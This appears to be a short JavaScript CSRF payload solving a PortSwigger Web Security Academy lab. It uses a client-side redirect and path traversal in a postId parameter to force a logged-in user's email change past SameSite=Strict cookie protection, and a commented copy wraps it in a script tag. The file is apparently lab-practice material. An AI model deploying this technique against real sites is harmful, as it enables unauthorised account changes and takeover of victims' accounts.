// The payload below is meant to solve the following lab:
// https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect

document.location = "https://[SUB_DOMAIN].web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?submit=1%26email=wiener3@normal-user.net";

/*
<script>
    document.location = "https://[SUB_DOMAIN].web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?submit=1%26email=wiener3@normal-user.net";
</script>
*/